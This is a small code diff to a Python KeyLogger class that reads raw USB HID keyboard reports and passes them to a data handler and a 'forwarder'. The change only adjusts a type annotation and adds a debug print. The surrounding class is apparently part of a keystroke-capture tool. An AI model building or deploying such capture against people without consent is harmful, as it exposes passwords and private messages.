@@ -15,7 +15,7 @@ class KeyLogger:
 
     def __init__(
         self,
-        keyboard_layout: dict[int, int],
+        keyboard_layout: dict[int, list[int,int]],
         data_handler: DataHandler,
         forwarder: Forwarder,
     ) -> None:
@@ -26,7 +26,7 @@ class KeyLogger:
         # create a forwarder
         self.__forwarder = forwarder
         # set keyboard
-        self.keyboard_layout = keyboard_layout
+        self.keyboard_layout: dict[int, list[int, int]] = keyboard_layout
 
     def __del__(self):
         pass
@@ -47,6 +47,7 @@ class KeyLogger:
     def run(self, id_vendor: int = 0x1C4F, device_id: int = 0x008B):
         keyboard = hid.device()
         keyboard.open(id_vendor, device_id)
+        print(self.keyboard_layout)
         while True:
             try:
                 data = keyboard.read(8)  # Read an 8-byte HID report
